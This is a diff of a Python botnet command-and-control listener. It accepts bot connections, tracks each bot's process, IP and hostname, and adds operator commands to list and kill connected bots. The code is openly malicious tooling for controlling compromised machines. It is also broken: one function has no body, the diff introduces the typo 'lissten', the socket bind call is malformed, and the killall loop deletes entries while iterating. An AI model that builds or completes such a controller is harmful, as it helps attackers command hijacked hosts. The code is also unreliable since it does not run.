@@ -6,28 +6,55 @@ import os
 import multiprocessing as mp
 import threading
 import queue
+import time
 
 q = queue.Queue()
-process_list[]
+process_list = []
+ip_list = []
+host_list = []
 
 def clientExecuter(client,client_addr,q):
     # Write code to actually send the data to client and recieve to response and save it in a dict
 
 def handlerExecuter(cmd):
     global process_list
+    global ip_list
+    global host_list
     
-    if(cmd[:4]=="kill"):
+    if(cmd[:4]=="kill"):    # kill specified connection
         proc_name = cmd[5:]
         flag = 0
-        for proc in process_list:
-            if(proc.name == proc_name):
-                proc.join()
-                print("[+] Process {proc_name} is terminated\n")
+        for i in range(len(process_list)):
+            if(process_list[i].name == proc_name):
+                process_list[i].terminate()
+                del process_list[i]
+                del ip_list[i]
+                del host_list[i]
+                print("[+] Process " + proc_name + " is terminated\n")
                 flag = 1
                 break
         if(flag == 0):
             print("[-] Process not found\n")
-    elif(cmd == "list"):
+
+    elif(cmd[:7]=="killall"):   # kill all conntections
+        flag = 0
+        for i in range(len(process_list)):
+            flag = 1
+            proc_name = process_list[i].name
+            process_list[i].terminate()
+            del process_list[i]
+            del ip_list[i]
+            del host_list[i]
+            print("[+] Process " + proc_name + " is terminated\n")
+        if(flag == 0):
+            print("[-] Process not found\n")
+
+    elif(cmd == "list"):    # list all the connected hosts
+        for i in range(len(process_list)):
+            proc_name = process_list[i]
+            ip_address = ip_list[i]
+            hostname = host_list[i]
+            print("{} {} {}".format(proc_name,ip_address,hostname))
         
 
 
@@ -54,7 +81,7 @@ def listener(lhost,lport,q):
     sock = socket.socket()
     sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     sock.bind(lhost,lport)
-    sock.listen(100)
+    sock.lissten(100)
     # Started the listener which can handle 100 connections.
     print ("[+] Starting Botnet listener on tcp://" + lhost + ":" + str(lport) + "\n")
         
@@ -66,7 +93,7 @@ def listener(lhost,lport,q):
     while(True):
         global process_list
         (client,client_addr) = sock.accept()
-        new_process = Process(target=clientExecuter,args=(client,client_addr,q))
+        new_process = mp.Process(target=clientExecuter,args=(client,client_addr,q))
         process_list.append(new_process)
         new_process.start()
         # Created new process for every connection that I get and save the process in process_list 
